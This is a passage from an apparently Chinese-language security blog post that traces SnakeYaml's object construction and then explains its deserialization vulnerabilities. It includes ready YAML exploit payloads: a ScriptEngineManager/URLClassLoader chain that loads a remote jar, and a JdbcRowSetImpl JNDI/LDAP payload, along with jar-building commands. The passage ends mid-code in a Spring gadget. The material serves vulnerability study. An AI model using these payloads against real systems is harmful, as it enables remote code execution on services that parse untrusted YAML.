+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">constructDocument</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> constructObject(node);</span><br><span class="line">            fillRecursive();</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (wrappedToRootException &amp;&amp; !(e <span class="keyword">instanceof</span> YAMLException)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//clean up resources</span></span><br><span class="line">            constructedObjects.clear();</span><br><span class="line">            recursiveObjects.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法中，通过<code>containsKey</code>方法来判断是否该节点已经被构造，若已构造，则会返回一个实例化过后的对象；反之，就会用指定的node节点构造对象，并返回对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObject</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (constructedObjects.containsKey(node)) &#123;</span><br><span class="line">            <span class="keyword">return</span> constructedObjects.get(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> constructObjectNoCheck(node);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们的节点并没有被构造过，所以会跳到<code>constructObjectNoCheck</code>方法中</p>
+<p>我们可以看到，这里将node节点放进到了<code>recursiveObjects</code>中，然后往下进行了一次判断：constructedObjects是否构造了该节点，如果构造了就用<code>get</code>方法获取到他，若没有构造，就调用<code>construct</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObjectNoCheck</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (recursiveObjects.contains(node)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;found unconstructable recursive node&quot;</span>,</span><br><span class="line">                    node.getStartMark());</span><br><span class="line">        &#125;</span><br><span class="line">        recursiveObjects.add(node);</span><br><span class="line">        <span class="type">Construct</span> <span class="variable">constructor</span> <span class="operator">=</span> getConstructor(node);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> (constructedObjects.containsKey(node)) ? constructedObjects.get(node)</span><br><span class="line">                : constructor.construct(node);</span><br><span class="line"></span><br><span class="line">        finalizeConstruction(node, data);</span><br><span class="line">        constructedObjects.put(node, data);</span><br><span class="line">        recursiveObjects.remove(node);</span><br><span class="line">        <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">            constructor.construct2ndStep(node, data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>步入<code>construct</code>方法，步入<code>ConstructYamlObject</code>的<code>construct</code>当中，但是这里没有做什么操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">construct</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> getConstructor(node).construct(node);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ConstructorException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;Can&#x27;t construct a java object for &quot;</span></span><br><span class="line">                        + node.getTag() + <span class="string">&quot;; exception=&quot;</span> + e.getMessage(), node.getStartMark(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们先看<code>getConstructor</code>方法中，<code>getClassForNode</code>方法为我们返回了一个Class类，后续setType方法为node设置了一个合适的类构造，后续走入<code>getClassForNode</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Construct <span class="title function_">getConstructor</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cl = getClassForNode(node);</span><br><span class="line">            node.setType(cl);</span><br><span class="line">            <span class="comment">// call the constructor as if the runtime class is defined</span></span><br><span class="line">            <span class="type">Construct</span> <span class="variable">constructor</span> <span class="operator">=</span> yamlClassConstructors.get(node.getNodeId());</span><br><span class="line">            <span class="keyword">return</span> constructor;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该<code>getClassForNode</code>方法中，他主要是通过反射为我们的node节点选取了一个合适的构造类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; getClassForNode(Node node) &#123;</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; classForTag = typeTags.get(node.getTag());</span><br><span class="line">        <span class="keyword">if</span> (classForTag == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> node.getTag().getClassName();</span><br><span class="line">            Class&lt;?&gt; cl;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cl = getClassForName(name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;Class not found: &quot;</span> + name);</span><br><span class="line">            &#125;</span><br><span class="line">            typeTags.put(node.getTag(), cl);</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> classForTag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回我们的构造类后，我们走入<code>construct</code>方法中，这里我们会跳到最后一个else中，将我们的类进行实例化，这里<code>node.isTwoStepsConstruction()</code>默认返回false，所以我们会进入到最后一个else中，将obj放入<code>constructJavaBean2ndStep</code>构造函数中并返回</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">construct</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">            <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) node;</span><br><span class="line">            <span class="keyword">if</span> (Map.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> newMap(mnode);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> constructMapping(mnode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Collection.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> newSet(mnode);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> constructSet(mnode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Constructor.<span class="built_in">this</span>.newInstance(mnode);</span><br><span class="line">                <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> obj;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> constructJavaBean2ndStep(mnode, obj);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，实例化已经完成</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742903926211-71a44dbc-d8f2-4042-82a3-2218ce8e5dd7.png"></p>
+<p>跟进<code>constructJavaBean2ndStep</code>函数中，该函数会从node中获取key和value的值，并赋值到我们的object参数中，最终返回一个完整的类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742904320541-93abe830-7b44-4064-91ba-b0396303238a.png"></p>
+<h3 id="BJPOu">奇怪特性的解释</h3>
+
+<p>我们之前说过，如果添加public属性，是不会调用该类的setter或getter方法的</p>
+<p>除public属性外的设置值或者获取值时，都是要反射获取他们的setter或者getter方法去完成相关的业务</p>
+<p>而经过调试来看，public属性的参数在获取值或者设置值的时候，和其他属性的是有差别的，public属性值的设置与获取，只是简单的反射获取与修改</p>
+<p>这里就不做过多分析，如果有想要跟进一下代码的师傅，可以从下面方法去跟进分析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//constructJavaBean2ndStep</span></span><br><span class="line">        <span class="keyword">if</span> (memberDescription == <span class="literal">null</span></span><br><span class="line">                            || !memberDescription.setProperty(object, key, value)) &#123;</span><br><span class="line">                        property.set(object, value);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Up6z3">SnakeYaml 反序列化漏洞之 SPI 链子</h2>
+<h3 id="UZsHY">漏洞原理</h3>
+我感觉这个漏洞也比较像fastjson的反序列化漏洞
+
+<p>有些区别的是，Fastjson中可以调用<code>getter/setter</code>的面很宽泛，而Snakeyaml只能调用非public，static以及transient作用域的setter方法</p>
+<h3 id="rOsYD">利用 SPI 机制 - 基于 ScriptEngineManager 利用链</h3>
+<h4 id="gWOCJ">EXP与攻击</h4>
+EXP如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPInScriptEngineManager</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;rqwdlmnfqg.lfcx.eu.org\&quot;]]]]\n&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到，也是成功接收到了URLDNS请求</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742910581855-a7bcbf04-064c-4042-889f-f52cf171be6a.png"></p>
+<p>该EXP只能进行简单的探测，攻击的话，可以使用<font style="color:rgb(80, 80, 92);">Github上的一个项目</font></p>
+<p><font style="color:rgb(80, 80, 92);"> </font><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload/">https://github.com/artsploit/yaml-payload/</a></p>
+<p>我们将项目中的命令，改成自己想要的就好</p>
+<p>然后使用如下两条命令，将该java文件打包成一个jar包，使用python开启一个http服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<p>使用如下payload，就可以用URLClassLoader去加载远程类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://127.0.0.1:8888/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742959338050-405c34f9-73bd-4d4a-a81a-9c76b0b8a26e.png"></p>
+<h4 id="SN9oS">SPL机制</h4>
+SPL（Service Provider Loader，服务提供者加载）机制是Java中的一种**服务提供发现**机制，用于动态加载和使用服务实现。它主要依赖于` java.util.ServiceLoader`，能够在运行时查找、加载和实例化符合某个接口或抽象类的实现类
+
+<p>那么如果需要使用 SPI 机制则需要在<code>Java classpath</code>下的<code>META-INF/services/</code>目录里创建一个以<strong>服务接口命名的文件</strong>，这个文件里的内容就是这个<strong>接口的具体的实现类</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742960230310-81ce672d-d39e-45bb-9733-dca944b51a9f.png"></p>
+<p>SPI是一种动态替换发现的机制，比如有个接口，想运行时动态的给它添加实现，你只需要添加一个实现</p>
+<p>这里使用JDBC的库 – <strong><font style="color:rgb(80, 80, 92);">mysql-connector-java</font></strong><font style="color:rgb(80, 80, 92);"> </font>来举例子</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到<code>META-INF/services/</code>路径下的文件名就是我们的<strong>服务接口名</strong>，内容就是<strong>接口的具体实现类</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742961202448-0a0cb6c1-f697-4995-b64c-1c04f35f7c60.png"></p>
+<p>而数据库有很多种类型，而实现方式不尽相同，而在实现各种连接驱动的时候，只需要添加java.sql.Driver实现接口，然后 Java 的 SPI 机制可以为某个接口寻找服务实现，就实现了各种数据库的驱动连接</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(</span><br><span class="line">                <span class="string">&quot;jdbc:mysql://localhost:3306/pikachu&quot;</span>, <span class="string">&quot;pikachu&quot;</span>, <span class="string">&quot;123456&quot;</span></span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">&quot;数据库连接成功：&quot;</span> + (conn != <span class="literal">null</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>工作原理如下：</strong></p>
+<ol>
+<li><p><code>DriverManager.getConnection()</code> 被调用时，<code>ServiceLoader</code> 通过 <code>META-INF/services/java.sql.Driver</code> 加载注册的驱动类。</p>
+</li>
+<li><p><code>ServiceLoader</code> 发现 <code>com.mysql.cj.jdbc.Driver</code> 并自动实例化。</p>
+</li>
+<li><p><code>DriverManager</code> 通过 <code>Driver#connect()</code> 方法建立数据库连接。</p>
+</li>
+</ol>
+<h4 id="D7BC4">漏洞分析</h4>
+
+<p>访问到jar包时，会扫描<code>META-INF/services</code>下的文件，扫到<code>javax.script.ScriptEngineFactory</code>，会创造这个接口的具体实现类，这个具体实现类就是<code>artsploit.AwesomeScriptEngineFactory</code>，也就是我们构造的恶意类。</p>
+<h2 id="Vp7T9">SnakeYaml 反序列化漏洞的 Gadgets</h2>
+<h3 id="O5hnp">JdbcRowSetImpl</h3>
+
+<p>这条链子也很熟悉了，在<code>JdbcRowSetImpl#connect</code>方法中，存在一个JNDI注入的地方（lookup处）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>getDataSourceName</code>方法返回了dataSource，而我们存在一个dataSource的setter方法，在进行反序列化时，会调用<code>setDataSourceName</code>方法，因此在lookup方法中，<code>this.getDataSourceName()</code>处是可控的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            dataSource = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           dataSource = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        URL = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们就该怎么去触发<code>connect</code>方法</p>
+<p>我们找到了<code>setAutoCommit</code>方法，他既可以调用connect，也是一个我们可以调用的setter方法，（参数都为private属性）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">            <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>EXP如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;ldap://127.0.0.1:8085/WRTOPmjx\&quot;, autoCommit: true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ygBkF">Spring PropertyPathFactoryBean</h3>
+依赖导入
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 或者其他 Spring 版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 选择合适的版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>PropertyPathFactoryBean#setBeanFactory</code>方法中调用了this.beanFactory的<code>getBean</code>方法，而<code>SimpleJndiBeanFactory</code>的<code>getBean</code>方法中存在JNDI注入点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743158772771-433b8527-a1d8-4a32-a00c-3a1f385a28d8.png"></p>
+<p>看到<code>SimpleJndiBeanFactory#getBean</code>方法，其中name可控，即可造成JNDI注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="keyword">return</span> getBean(name, Object.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title 